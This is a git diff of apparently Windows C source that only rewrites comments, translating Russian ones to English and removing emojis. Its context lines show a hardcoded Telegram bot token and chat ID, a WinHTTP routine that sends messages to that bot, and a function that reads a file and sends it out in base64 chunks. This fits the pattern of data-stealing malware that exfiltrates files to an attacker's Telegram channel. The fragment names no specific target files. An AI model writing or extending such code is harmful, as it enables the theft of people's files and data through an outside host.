@@ -123,7 +123,7 @@
 #define TOKEN L"/bot8077364032:AAHTJbcbULWSH7dXAX3l8xpmUZzP6EeL7VQ/sendMessage"
 #define CHAT_ID "5547299598"
 
-// 🔧 URL-encode
+// URL-encode
 char* url_encode(const char* str) {
   size_t len = strlen(str);
   char* enc = malloc(len * 3 + 1);
@@ -144,7 +144,7 @@ char* url_encode(const char* str) {
   return enc;
 }
 
-// 🔧 Base64 encode
+// Base64 encode
 char* base64_encode(const BYTE* buffer, DWORD length) {
   DWORD base64Len = 0;
   CryptBinaryToStringA(buffer, length, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, NULL, &base64Len);
@@ -154,7 +154,7 @@ char* base64_encode(const BYTE* buffer, DWORD length) {
   return base64;
 }
 
-// 🚀 Отправка в Telegram
+// send to Telegram
 int sendToTgBot(const char* message) {
   HINTERNET hSession = WinHttpOpen(L"UserAgent", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);
   if (!hSession) return 1;
@@ -203,7 +203,7 @@ int sendToTgBot(const char* message) {
   return 0;
 }
 
-// 🧬 Чтение файла и отправка по частям
+// read file and sending chunks
 void sendBase64File(const char* filePath) {
   FILE* f = fopen(filePath, "rb");
   if (!f) {
